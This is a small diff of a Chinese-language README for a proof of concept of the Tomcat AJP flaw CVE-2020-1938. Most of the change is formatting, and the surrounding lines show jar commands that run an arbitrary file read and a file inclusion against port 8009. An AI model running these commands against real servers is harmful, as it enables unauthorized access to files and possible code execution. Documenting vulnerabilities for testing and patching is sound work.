@@ -6,7 +6,7 @@
 ## poc1  
 1.参考链接（https://github.com/0nise/CVE-2020-1938）  
 任意文件读取  
-```java -jar 1.jar com.threedr3am.bug.tomcat.ajp.FileRead 127.0.0.1 8009 file /index.jsp```  
+`java -jar 1.jar com.threedr3am.bug.tomcat.ajp.FileRead 127.0.0.1 8009 file /index.jsp`  
 文件包含  
 ```java -jar 1.jar com.threedr3am.bug.tomcat.ajp.FileRead 127.0.0.1 8009 jsp /index.jsp```  
 截图如下  
